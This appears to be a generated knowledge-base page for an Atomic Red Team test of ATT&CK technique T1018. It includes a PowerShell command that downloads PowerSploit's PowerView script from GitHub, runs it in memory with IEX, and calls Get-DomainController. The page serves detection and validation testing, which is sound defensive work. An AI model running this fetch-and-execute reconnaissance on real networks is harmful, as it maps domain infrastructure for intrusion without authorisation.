---
atomic_guid: "b9d2e8ca-5520-4737-8076-4f08913da2c4"
title: "Get-DomainController with PowerView"
framework: "atomic"
generated: "true"
attack_technique_id: "T1018"
attack_technique_name: "Remote System Discovery"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1018/T1018.yaml"
build_date: "2026-04-27 19:12:25"
executor: "powershell"
aliases:
  - "b9d2e8ca-5520-4737-8076-4f08913da2c4"
  - "Get-DomainController with PowerView"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Utilizing PowerView, run Get-DomainController to identify the Domain Controller. Upon execution, information about the domain controller within the domain will be displayed.

## ATT&CK Mapping

- [[kb/attack/techniques/T1018-remote_system_discovery|T1018: Remote System Discovery]]

## Executor

- name: powershell

### Command

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainController -verbose
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1018/T1018.yaml)
